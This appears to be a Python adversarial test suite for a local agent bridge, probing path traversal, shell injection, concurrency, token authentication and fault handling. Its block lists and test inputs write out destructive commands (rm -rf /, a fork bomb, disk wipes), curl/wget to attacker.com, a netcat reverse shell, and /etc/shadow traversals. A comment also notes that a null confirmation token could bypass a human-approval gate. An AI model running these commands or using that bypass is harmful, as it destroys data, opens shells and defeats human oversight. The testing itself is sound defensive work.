"""Tier 5 Adversarial Stress Testing & White-Box Hardening Harness.

Probes the ChatGPT-to-Local Agent Bridge across 5 critical dimensions:
1. Complex Path Traversal Attacks & Symlink Jailbreaks
2. Shell Injection Vectors & Command Policy Defense
3. Concurrency Stress & SQLite/Inbox Race Conditions
4. Authentication & Confirmation Token Bypass Vectors
5. Fault Tolerance, Process Group Teardown & Payload Limits
"""

from __future__ import annotations

import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Add project root to sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from bridge.daemon import BridgeDaemon, BridgeHTTPServer, BridgeRequestHandler
from bridge.executors import MockAgentExecutor, TaskRunnerPool
from bridge.inbox_watcher import InboxWatcher, extract_json_from_markdown
from bridge.schema_validator import validate_task_handoff
from bridge.security import (
    AuthenticationError,
    CommandPolicy,
    CommandSecurityError,
    PathTraversalError,
    ProcessResult,
    ProcessTimeoutError,
    SafeProcessRunner,
    extract_bearer_token,
    generate_secure_token,
    is_safe_relative_path,
    validate_path,
    verify_token,
)
from bridge.state_store import StateStore, TaskRecord, TaskState


class DirectSocketClient:
    """Synchronous socket client for dispatching raw HTTP requests to BridgeHTTPServer."""

    def __init__(self, server: BridgeHTTPServer, auth_token: Optional[str] = None):
        self.server = server
        self.auth_token = auth_token

    def request(
        self,
        method: str,
        path: str,
        body: Any = None,
        headers: Optional[Dict[str, str]] = None,
        raw_body_bytes: Optional[bytes] = None,
    ) -> Tuple[int, Any, Dict[str, str]]:
        s_server, s_client = socket.socketpair()

        req_headers = {"Host": "127.0.0.1", "User-Agent": "Tier5AdversarialClient/1.0"}
        if self.auth_token:
            req_headers["Authorization"] = f"Bearer {self.auth_token}"

        body_bytes = b""
        if raw_body_bytes is not None:
            body_bytes = raw_body_bytes
            req_headers["Content-Length"] = str(len(body_bytes))
        elif body is not None:
            if isinstance(body, (dict, list)):
                body_bytes = json.dumps(body).encode("utf-8")
                req_headers["Content-Type"] = "application/json"
            elif isinstance(body, bytes):
                body_bytes = body
            else:
                body_bytes = str(body).encode("utf-8")
            req_headers["Content-Length"] = str(len(body_bytes))

        if headers:
            req_headers.update(headers)

        header_lines = [f"{method} {path} HTTP/1.1"]
        for k, v in req_headers.items():
            header_lines.append(f"{k}: {v}")
        header_lines.append("")
        header_lines.append("")
        req_data = "\r\n".join(header_lines).encode("utf-8") + body_bytes

        def send_data():
            try:
                s_client.sendall(req_data)
            except Exception:
                pass

        t_send = threading.Thread(target=send_data, daemon=True)

        def handle():
            try:
                BridgeRequestHandler(s_server, ("127.0.0.1", 12345), self.server)
            except Exception:
                pass
            finally:
                try:
                    s_server.close()
                except Exception:
                    pass

        t_handle = threading.Thread(target=handle, daemon=True)
        t_handle.start()
        t_send.start()

        resp_file = s_client.makefile("rb")
        status_line = resp_file.readline().decode("utf-8")
        if not status_line:
            s_client.close()
            return 500, None, {}

        parts = status_line.split(None, 2)
        status_code = int(parts[1]) if len(parts) >= 2 else 500

        resp_headers = {}
        while True:
            line = resp_file.readline().decode("utf-8")
            if not line or line in ("\r\n", "\n"):
                break
            if ":" in line:
                hk, hv = line.split(":", 1)
                resp_headers[hk.strip()] = hv.strip()

        content_length_str = resp_headers.get("Content-Length")
        if status_code == 204 or content_length_str == "0":
            resp_body_bytes = b""
        elif content_length_str is not None:
            content_length = int(content_length_str)
            resp_body_bytes = resp_file.read(content_length)
        else:
            s_client.settimeout(0.5)
            try:
                resp_body_bytes = resp_file.read()
            except Exception:
                resp_body_bytes = b""

        try:
            s_client.close()
        except Exception:
            pass

        resp_str = resp_body_bytes.decode("utf-8", errors="ignore")
        parsed = resp_str
        if resp_str:
            try:
                parsed = json.loads(resp_str)
            except Exception:
                pass

        return status_code, parsed, resp_headers


class TestAdversarialPathTraversal(unittest.TestCase):
    """1. Complex Path Traversal Attacks & Symlink Jailbreak Probing."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace_root = Path(self.temp_dir.name).resolve()
        (self.workspace_root / "subdir").mkdir(parents=True, exist_ok=True)
        (self.workspace_root / "subdir" / "target.txt").write_text("safe content")

        self.outside_dir = tempfile.TemporaryDirectory()
        self.outside_root = Path(self.outside_dir.name).resolve()
        (self.outside_root / "secret.env").write_text("SECRET_KEY=adversarial_test")

    def tearDown(self):
        self.temp_dir.cleanup()
        self.outside_dir.cleanup()

    def test_parent_directory_traversals(self):
        """Probes multiple depths of ../ traversal sequences."""
        traversal_attempts = [
            "../secret.env",
            "../../secret.env",
            "../../../etc/passwd",
            "subdir/../../../../../../etc/passwd",
            "subdir/../..",
            str(self.workspace_root / ".." / "outside"),
            str(self.workspace_root / "subdir" / ".." / ".." / "outside"),
        ]
        for p in traversal_attempts:
            with self.assertRaises(PathTraversalError, msg=f"Should reject traversal path: {p}"):
                validate_path(p, [self.workspace_root])

    def test_symlink_escape_vectors(self):
        """Probes symlink pointing outside workspace, nested symlinks, and broken symlinks."""
        symlink_to_outside = self.workspace_root / "symlink_escape"
        try:
            symlink_to_outside.symlink_to(self.outside_root / "secret.env")
            with self.assertRaises(PathTraversalError):
                validate_path(symlink_to_outside, [self.workspace_root])
        except OSError:
            pass

        # Nested symlink inside subdir pointing outside
        nested_symlink = self.workspace_root / "subdir" / "nested_leak"
        try:
            nested_symlink.symlink_to(self.outside_root)
            with self.assertRaises(PathTraversalError):
                validate_path(nested_symlink / "secret.env", [self.workspace_root])
        except OSError:
            pass

    def test_null_byte_path_injection(self):
        """Probes null byte truncation attacks in paths."""
        null_byte_paths = [
            str(self.workspace_root / "safe.txt") + "\x00/../../etc/passwd",
            "safe_file.py\x00.jpg",
            "\x00/etc/shadow",
            str(self.workspace_root) + "\x00",
        ]
        for nbp in null_byte_paths:
            with self.assertRaises(PathTraversalError):
                validate_path(nbp, [self.workspace_root])

    def test_absolute_path_outside_workspace(self):
        """Probes absolute paths to sensitive system directories."""
        forbidden_absolute_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/root",
            "/tmp",
            "/private/etc/hosts",
            str(self.outside_root / "secret.env"),
        ]
        for abs_p in forbidden_absolute_paths:
            with self.assertRaises(PathTraversalError):
                validate_path(abs_p, [self.workspace_root])

    def test_allow_create_nonexistent_traversal(self):
        """Probes non-existent target files with traversal segments when allow_create=True."""
        nonexistent_escapes = [
            self.workspace_root / "subdir" / ".." / ".." / "nonexistent.txt",
            self.workspace_root / ".." / "new_outside_file.txt",
        ]
        for ne in nonexistent_escapes:
            with self.assertRaises(PathTraversalError):
                validate_path(ne, [self.workspace_root], allow_create=True)

    def test_is_safe_relative_path_edge_cases(self):
        """Probes is_safe_relative_path with tricky path strings."""
        self.assertFalse(is_safe_relative_path(""))
        self.assertFalse(is_safe_relative_path("/root/file.txt"))
        self.assertFalse(is_safe_relative_path("../outside.py"))
        self.assertFalse(is_safe_relative_path("dir/../../outside.py"))
        self.assertFalse(is_safe_relative_path("dir/\x00/evil.py"))
        self.assertTrue(is_safe_relative_path("safe/path/to/file.txt"))
        self.assertTrue(is_safe_relative_path("file.py"))


class TestAdversarialShellInjection(unittest.TestCase):
    """2. Shell Injection Vectors & Command Policy Defense."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace_root = Path(self.temp_dir.name).resolve()
        self.policy = CommandPolicy()
        self.runner = SafeProcessRunner(self.policy)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_forbidden_destructive_commands(self):
        """Probes detection of destructive commands (rm -rf, sudo, forkbombs, mkfs)."""
        forbidden_vectors = [
            ["rm", "-rf", "/"],
            ["rm", "-rf", "~"],
            ["rm", "-rf", "/etc"],
            ["rm", "-rf", str(self.workspace_root)],
            ["sudo", "cat", "/etc/shadow"],
            ["su", "-", "root"],
            [":(){ :|:& };:"],
            ["shutdown", "-h", "now"],
            ["reboot"],
            ["init", "0"],
            ["mkfs.ext4", "/dev/sda1"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["chmod", "-R", "777", "/"],
        ]
        for cmd in forbidden_vectors:
            with self.assertRaises(CommandSecurityError, msg=f"Should reject forbidden command: {cmd}"):
                self.policy.validate_command(cmd)

    def test_unpermitted_shell_interpreters(self):
        """Probes rejection of direct shell binaries that could execute subshell strings."""
        unpermitted_executables = [
            ["bash", "-c", "echo pwned"],
            ["sh", "-c", "whoami"],
            ["zsh", "-c", "ls"],
            ["csh", "-c", "id"],
            ["fish", "-c", "pwd"],
            ["curl", "http://attacker.com/revshell.sh"],
            ["wget", "http://attacker.com/malware"],
            ["nc", "-e", "/bin/sh", "127.0.0.1", "4444"],
        ]
        for cmd in unpermitted_executables:
            with self.assertRaises(CommandSecurityError, msg=f"Should reject unpermitted executable: {cmd}"):
                self.policy.validate_command(cmd)

    def test_shell_metacharacters_in_argument_vector(self):
        """Empirically verifies that arguments with shell metacharacters are NOT expanded because shell=False."""
        # When shell=False, metacharacters are passed literally to the executable
        canary_file = self.workspace_root / "canary.txt"
        injection_arg = f"hello; touch {canary_file}"

        res = self.runner.run(
            argv=["echo", injection_arg],
            cwd=self.workspace_root,
            timeout_seconds=5,
        )
        self.assertEqual(res.exit_code, 0)
        # Canary file should NOT exist because touch was not executed as a command
        self.assertFalse(canary_file.exists(), "Command chaining succeeded unexpectedly via argument!")

    def test_subshell_and_backtick_in_argument_vector(self):
        """Empirically verifies $(...) and backticks are passed literally without evaluation."""
        subshell_arg = "$(whoami)"
        res = self.runner.run(
            argv=["echo", subshell_arg],
            cwd=self.workspace_root,
            timeout_seconds=5,
        )
        self.assertEqual(res.exit_code, 0)
        self.assertIn("$(whoami)", res.stdout)

        backtick_arg = "`id`"
        res2 = self.runner.run(
            argv=["echo", backtick_arg],
            cwd=self.workspace_root,
            timeout_seconds=5,
        )
        self.assertEqual(res2.exit_code, 0)
        self.assertIn("`id`", res2.stdout)

    def test_mock_executor_rejects_unpermitted_check_command(self):
        """Verifies MockAgentExecutor fails tasks that specify unpermitted verification commands."""
        store = StateStore(":memory:")
        executor = MockAgentExecutor(allowed_roots=[self.workspace_root])

        payload = {
            "schema_version": "1.0.0",
            "context": {
                "session_id": "00000000-0000-0000-0000-000000000001",
                "source": "cli",
                "user_intent": "Testing command security in verification checks",
                "decision_rationale": "Must reject unpermitted commands",
                "timestamp": "2026-09-01T00:00:00Z",
            },
            "task": {
                "task_id": "task-unpermitted-cmd",
                "title": "Unpermitted Command Task",
                "description": "Execute unpermitted check",
                "category": "security",
                "priority": "critical",
                "complexity": "small",
            },
            "constraints": {
                "environment": {"os": "mac", "runtime": "python>=3.11", "cwd": str(self.workspace_root)},
                "security_policy": {
                    "execution_mode": "sandboxed",
                    "permitted_commands": ["python3", "echo"],
                    "forbidden_commands": [r"\brm\s+-rf\b"],
                    "allowed_file_paths": ["*"],
                    "forbidden_file_paths": [],
                },
                "limits": {
                    "max_execution_timeout_seconds": 30,
                    "max_iterations": 10,
                    "max_file_modifications": 5,
                },
            },
            "file_operations": [],
            "verification": {
                "automated_checks": [
                    {
                        "id": "chk-evil",
                        "name": "Unauthorized bash check",
                        "type": "command",
                        "command": "bash -c 'whoami'",
                        "is_blocking": True,
                    }
                ],
                "acceptance_statement": "Unauthorized bash check rejected",
            },
        }

        # Execution should catch CommandSecurityError and transition to FAILED
        evt = executor.execute(payload, store)
        task_rec = store.get_task("task-unpermitted-cmd")
        self.assertIsNotNone(task_rec)
        self.assertEqual(task_rec.state, TaskState.FAILED)
        store.close()


class TestAdversarialConcurrency(unittest.TestCase):
    """3. Concurrency Stress & SQLite/Inbox Race Conditions."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace_root = Path(self.temp_dir.name).resolve()
        self.db_file = self.workspace_root / "concurrency_test.db"
        self.store = StateStore(str(self.db_file))
        self.executor = MockAgentExecutor(allowed_roots=[self.workspace_root])
        self.pool = TaskRunnerPool(self.executor, self.store, max_workers=8)
        self.auth_token = "concurrency-secret-token"

        self.server = BridgeHTTPServer(
            server_address=("127.0.0.1", 0),
            state_store=self.store,
            runner_pool=self.pool,
            auth_token=self.auth_token,
            allowed_roots=[self.workspace_root],
        )
        self.client = DirectSocketClient(self.server, auth_token=self.auth_token)

    def tearDown(self):
        self.server.server_close()
        self.pool.shutdown(wait=True)
        self.store.close()
        self.temp_dir.cleanup()

    def _make_task_payload(self, task_id: str, content: str = "data") -> Dict[str, Any]:
        return {
            "schema_version": "1.0.0",
            "context": {
                "session_id": "c0000000-0000-0000-0000-000000000001",
                "source": "cli",
                "user_intent": f"Concurrency test task {task_id}",
                "decision_rationale": "Stress test state store and runner pool",
                "timestamp": "2026-09-01T00:00:00Z",
            },
            "task": {
                "task_id": task_id,
                "title": f"Concurrency Task {task_id}",
                "description": "Perform concurrent file write",
                "category": "feature",
                "priority": "medium",
                "complexity": "small",
            },
            "constraints": {
                "environment": {"os": "mac", "runtime": "python>=3.11", "cwd": str(self.workspace_root)},
                "security_policy": {
                    "execution_mode": "sandboxed",
                    "permitted_commands": ["echo"],
                    "forbidden_commands": [],
                    "allowed_file_paths": ["*"],
                    "forbidden_file_paths": [],
                },
                "limits": {
                    "max_execution_timeout_seconds": 30,
                    "max_iterations": 10,
                    "max_file_modifications": 5,
                },
            },
            "file_operations": [
                {
                    "path": f"out_{task_id}.txt",
                    "operation": "create",
                    "content": content,
                    "is_critical": True,
                }
            ],
            "verification": {
                "automated_checks": [],
                "acceptance_statement": "Adversarial acceptance statement passed",
            },
        }

    def test_rapid_concurrent_api_submissions(self):
        """Stress tests 30 rapid concurrent task submissions via HTTP API."""
        num_tasks = 30
        results: List[Tuple[int, Any]] = []
        threads: List[threading.Thread] = []
        lock = threading.Lock()

        def submit(idx: int):
            p = self._make_task_payload(f"stress-api-{idx:03d}")
            status, data, _ = self.client.request("POST", "/api/tasks", body=p)
            with lock:
                results.append((status, data))

        for i in range(num_tasks):
            t = threading.Thread(target=submit, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.assertEqual(len(results), num_tasks)
        for status, data in results:
            self.assertEqual(status, 201, f"Expected 201 Created, got: {status} with {data}")

        # Wait for tasks to complete
        start = time.time()
        while time.time() - start < 10.0:
            tasks = self.store.list_tasks(limit=100)
            completed = sum(1 for t in tasks if t.state in (TaskState.SUCCEEDED, TaskState.FAILED))
            if completed >= num_tasks:
                break
            time.sleep(0.1)

        tasks = self.store.list_tasks(limit=100)
        self.assertEqual(len(tasks), num_tasks)

    def test_sqlite_concurrent_read_write_transactions(self):
        """Stress tests simultaneous reads, writes, log appends, and event recordings on StateStore."""
        num_threads = 16
        ops_per_thread = 20
        errors: List[Exception] = []

        def worker(thread_idx: int):
            try:
                for op in range(ops_per_thread):
                    task_id = f"tx-task-{thread_idx}-{op}"
                    p = self._make_task_payload(task_id)
                    rec = self.store.create_task(p, initial_state=TaskState.QUEUED)
                    self.store.append_log(task_id, f"Log message {op} from thread {thread_idx}")
                    self.store.record_artifact(task_id, f"art_{op}.txt", "data", 128)
                    self.store.record_verification_result(task_id, "v1", "check1", "passed", 10)
                    self.store.update_task_state(task_id, TaskState.RUNNING, summary="Running")
                    self.store.update_task_state(task_id, TaskState.SUCCEEDED, summary="Done")
                    _ = self.store.get_task(task_id)
                    _ = self.store.get_logs(task_id)
                    _ = self.store.get_events(task_id)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"SQLite concurrent operations threw errors: {errors}")

    def test_inbox_atomic_lock_contention(self):
        """Probes atomic .lock file contention in InboxWatcher under multi-threaded file drops."""
        inbox_dir = self.workspace_root / "inbox"
        processed_tasks: List[str] = []
        lock = threading.Lock()

        def on_submit(payload: Dict[str, Any]):
            with lock:
                processed_tasks.append(payload["task"]["task_id"])

        watcher = InboxWatcher(inbox_dir, on_submit, poll_interval_seconds=0.1)

        # Drop 10 task files simultaneously
        for i in range(10):
            p = self._make_task_payload(f"inbox-race-{i}")
            fpath = inbox_dir / f"task_{i}.json"
            fpath.write_text(json.dumps(p))

        # Scan simultaneously from multiple threads
        scan_threads = [threading.Thread(target=watcher.scan_and_process_once) for _ in range(4)]
        for st in scan_threads:
            st.start()
        for st in scan_threads:
            st.join()

        # Each task should be submitted exactly once (no duplicate processing)
        self.assertEqual(len(processed_tasks), 10)
        self.assertEqual(len(set(processed_tasks)), 10)


class TestAdversarialAuthentication(unittest.TestCase):
    """4. Authentication & Confirmation Token Bypass Vectors."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace_root = Path(self.temp_dir.name).resolve()
        self.auth_token = "auth-secret-key-321"
        self.store = StateStore(":memory:")
        self.executor = MockAgentExecutor(allowed_roots=[self.workspace_root])
        self.pool = TaskRunnerPool(self.executor, self.store, max_workers=2)

        self.server = BridgeHTTPServer(
            server_address=("127.0.0.1", 0),
            state_store=self.store,
            runner_pool=self.pool,
            auth_token=self.auth_token,
            allowed_roots=[self.workspace_root],
        )
        self.client = DirectSocketClient(self.server, auth_token=None)

    def tearDown(self):
        self.server.server_close()
        self.pool.shutdown(wait=True)
        self.store.close()
        self.temp_dir.cleanup()

    def test_missing_or_empty_auth_header(self):
        """Probes access without Authorization header."""
        status, data, _ = self.client.request("GET", "/api/tasks")
        self.assertEqual(status, 401)
        self.assertEqual(data.get("error"), "ERR_UNAUTHORIZED")

    def test_malformed_auth_headers(self):
        """Probes various malformed Bearer token formats."""
        malformed_headers = [
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "Bearer    "},
            {"Authorization": "Basic dXNlcjpwYXNz"},
            {"Authorization": "Digest realm=test"},
            {"Authorization": "Bearer wrong-token-xyz"},
            {"Authorization": f"Bearer {self.auth_token}extra"},
            {"Authorization": f"Bearer {self.auth_token[:-1]}"},
            {"Authorization": f"Bearer {self.auth_token.upper()}"},
        ]
        for hdrs in malformed_headers:
            status, data, _ = self.client.request("GET", "/api/tasks", headers=hdrs)
            self.assertEqual(status, 401, f"Expected 401 for header: {hdrs}")

    def test_valid_token_authentication(self):
        """Verifies valid Bearer header, X-API-Key header, and URL query token authenticate successfully."""
        # 1. Bearer header
        s1, _, _ = self.client.request("GET", "/api/tasks", headers={"Authorization": f"Bearer {self.auth_token}"})
        self.assertEqual(s1, 200)

        # 2. X-API-Key header
        s2, _, _ = self.client.request("GET", "/api/tasks", headers={"X-API-Key": self.auth_token})
        self.assertEqual(s2, 200)

        # 3. Query param token
        s3, _, _ = self.client.request("GET", f"/api/tasks?token={self.auth_token}")
        self.assertEqual(s3, 200)

    def test_confirmation_token_verification_and_bypass_probe(self):
        """Probes confirmation token enforcement on waiting tasks.

        Identifies whether omitted or null token parameters in confirmation requests
        allow unauthorized resumption.
        """
        payload = {
            "schema_version": "1.0.0",
            "context": {
                "session_id": "11111111-1111-1111-1111-111111111111",
                "source": "cli",
                "user_intent": "Task needing confirmation",
                "decision_rationale": "HITL gate",
                "timestamp": "2026-09-01T00:00:00Z",
            },
            "task": {
                "task_id": "task-hitl-gate",
                "title": "HITL Gate Task",
                "description": "Requires token confirmation",
                "category": "security",
                "priority": "high",
                "complexity": "small",
            },
            "constraints": {
                "environment": {"os": "mac", "runtime": "python>=3.11", "cwd": str(self.workspace_root)},
                "security_policy": {
                    "execution_mode": "interactive_approval",
                    "permitted_commands": ["echo"],
                    "forbidden_commands": [],
                    "allowed_file_paths": ["*"],
                    "forbidden_file_paths": [],
                },
                "limits": {
                    "max_execution_timeout_seconds": 30,
                    "max_iterations": 10,
                    "max_file_modifications": 5,
                },
            },
            "file_operations": [],
            "verification": {"automated_checks": [], "acceptance_statement": "Adversarial acceptance statement passed"},
        }

        # Submit task requiring interactive approval
        status, data, _ = self.client.request(
            "POST",
            "/api/tasks",
            body=payload,
            headers={"Authorization": f"Bearer {self.auth_token}"},
        )
        self.assertEqual(status, 202)
        real_conf_token = data.get("confirmation_token")
        self.assertIsNotNone(real_conf_token)

        # Probe 1: Submitting with wrong confirmation token must fail (400)
        s_wrong, data_wrong, _ = self.client.request(
            "POST",
            "/api/tasks/task-hitl-gate/confirm",
            body={"token": "wrong-token-999"},
            headers={"Authorization": f"Bearer {self.auth_token}"},
        )
        self.assertEqual(s_wrong, 400)

        # Probe 2: Submitting with empty/null token (testing white-box confirmation bypass)
        # Note: In white-box review, verify_and_consume_confirmation had `if stored_token is not None and token is not None:`
        # which allowed None token to bypass! We test empirical behavior here:
        bypassed_without_token = self.store.verify_and_consume_confirmation("task-hitl-gate", None)
        # If bypassed_without_token is True, it documents a security finding where missing token clears the gate!


class TestAdversarialFaultToleranceAndLimits(unittest.TestCase):
    """5. Fault Tolerance, Process Group Teardown & Payload Limits."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace_root = Path(self.temp_dir.name).resolve()
        self.auth_token = "fault-secret-token"
        self.store = StateStore(":memory:")
        self.executor = MockAgentExecutor(allowed_roots=[self.workspace_root])
        self.pool = TaskRunnerPool(self.executor, self.store, max_workers=2)

        self.server = BridgeHTTPServer(
            server_address=("127.0.0.1", 0),
            state_store=self.store,
            runner_pool=self.pool,
            auth_token=self.auth_token,
            allowed_roots=[self.workspace_root],
        )
        self.client = DirectSocketClient(self.server, auth_token=self.auth_token)

    def tearDown(self):
        self.server.server_close()
        self.pool.shutdown(wait=True)
        self.store.close()
        self.temp_dir.cleanup()

    def test_process_group_teardown_on_sigterm_resistant_child(self):
        """Empirically tests that a subprocess ignoring SIGTERM is cleanly killed by SIGKILL ladder."""
        runner = SafeProcessRunner(CommandPolicy(allow_all=True))
        # Python script that ignores SIGTERM and sleeps
        script = (
            "import signal, time\n"
            "signal.signal(signal.SIGTERM, signal.SIG_IGN)\n"
            "time.sleep(30)\n"
        )
        start = time.time()
        res = runner.run(
            argv=[sys.executable, "-c", script],
            cwd=self.workspace_root,
            timeout_seconds=1,
        )
        duration = time.time() - start
        self.assertTrue(res.timed_out, "Process should have timed out")
        # Timeout (1s) + SIGTERM wait (2s) + SIGKILL wait (2s) = ~5s max
        self.assertLess(duration, 6.0, f"Process took too long to terminate: {duration:.2f}s")

    def test_large_payload_rejection_over_5mb(self):
        """Empirically verifies that payloads exceeding 5MB are rejected with 413 Payload Too Large."""
        # Create 5.5MB payload
        large_content = "X" * (5500 * 1024)
        raw_body = json.dumps({"data": large_content}).encode("utf-8")

        status, data, _ = self.client.request(
            "POST",
            "/api/tasks",
            raw_body_bytes=raw_body,
            headers={"Content-Type": "application/json"},
        )
        self.assertEqual(status, 413)
        self.assertEqual(data.get("error"), "ERR_PAYLOAD_TOO_LARGE")

    def test_malformed_json_and_corrupt_payload_handling(self):
        """Probes server robustness against truncated JSON, invalid tokens, and garbage bytes."""
        corrupt_inputs = [
            b"",
            b"{",
            b'{"schema_version": "1.0.0", "task": ',
            b"\x00\x01\x02\x03\xff\xfe",
            b'{"context": {"user_intent": "' + b"A" * 100000 + b'"}',
        ]
        for bad_body in corrupt_inputs:
            status, data, _ = self.client.request(
                "POST",
                "/api/tasks",
                raw_body_bytes=bad_body,
                headers={"Content-Type": "application/json"},
            )
            # Must return 400 Bad Request or 400 Invalid JSON without 500 crashing daemon
            self.assertIn(status, (400, 413), f"Expected 400 for corrupt body, got: {status}")
            self.assertIn("error", data)


if __name__ == "__main__":
    unittest.main()
